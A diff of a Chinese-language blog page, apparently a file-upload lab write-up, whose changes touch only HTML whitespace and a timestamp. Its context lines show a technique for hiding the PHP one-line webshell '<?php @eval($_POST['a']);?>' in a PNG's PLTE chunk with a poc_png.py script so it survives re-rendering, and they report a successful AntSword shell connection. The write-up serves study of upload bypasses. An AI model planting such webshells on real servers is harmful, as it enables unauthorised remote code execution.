@@ -677,10 +677,10 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <li>
 <p>写入 <code>PLTE</code> 数据块</p>
 <p><figure><img src="/ox-hugo/png_trojan.png" width="100px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-01_21-53-41_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>我们可以先利用imagemagick将图片转换为索引图像/基于调色板图像（Palette-based images） <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">convert png.png -type Palette png_trojan.png
@@ -688,12 +688,12 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
     >脚本</a>来进行一句话木马的输入 <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 poc_png.py -p <span class="s1">&#39;&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;&#39;</span> -o png_trojan.png png_trojan.png
 </span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-01_22-42-09_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>尝试上传 <!-- raw HTML omitted --></p>
 <p>查看二次渲染后的图片，发现一句话木马插入成功，蚁剑连接成功 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-01_22-41-51_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 </li>
 </ul>
@@ -704,11 +704,11 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <p>利用脚本， <!-- raw HTML omitted --></p>
 <p>下载二次渲染之后的图片，检查一句话木马 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-01_22-52-43_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>shell利用成功 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-01_22-58-39_screenshot.png" width="700px"/>
-</figure>
+    </figure>
  <!-- raw HTML omitted --></p>
 </li>
 </ul>
@@ -920,7 +920,7 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 
 
         <span>
-            Last updated on May 20, 2022 15:11 BST
+            Last updated on May 20, 2022 15:11 &#43;0100
         </span>
     </section></footer>
 
